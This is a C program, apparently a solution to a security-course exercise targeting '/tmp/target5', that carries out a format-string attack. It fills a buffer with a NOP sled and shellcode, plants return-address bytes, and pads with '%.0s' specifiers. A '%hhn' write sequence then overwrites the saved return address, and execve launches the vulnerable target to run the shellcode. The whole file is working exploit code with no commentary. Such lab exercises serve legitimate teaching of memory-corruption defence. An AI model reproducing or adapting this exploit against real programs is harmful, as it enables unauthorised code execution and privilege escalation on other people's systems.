#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char sploit[1000];
  memset(sploit, '\x90', sizeof(sploit));
  sploit[sizeof(sploit)-1] = '\0';

  int ret_addr = 0xbffffa80;
  int arg_addr = 0xbffffc07;
  int init_esp = 0xbffff8ec;
  int offset = arg_addr - init_esp;

  memcpy(sploit+sizeof(sploit)-sizeof(shellcode), shellcode, sizeof(shellcode)-1);
  int shell_addr = arg_addr + sizeof(sploit) - sizeof(shellcode);

  char* index = sploit;
  sploit[0] = 'a';
  index++;
  *(int*)index = 0xffffffff;
  index += 4;
  *(int*)index = ret_addr + 3;
  index += 4;
  *(int*)index = ret_addr;
  index += 4;
  *(int*)index = 0xffffffff;
  index += 4;
  *(int*)index = ret_addr + 1;
  index += 4;
  *(int*)index = ret_addr + 2;
  index += 4;

  for(int i=0; i<199; i++){
    memcpy(index, "%.0s", 4);
    index += 4;
    }
  
  memcpy(index, "%166u%hhnaa%hhn%62u%hhn%hhn", 27);

  char *args[] = { TARGET, sploit, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
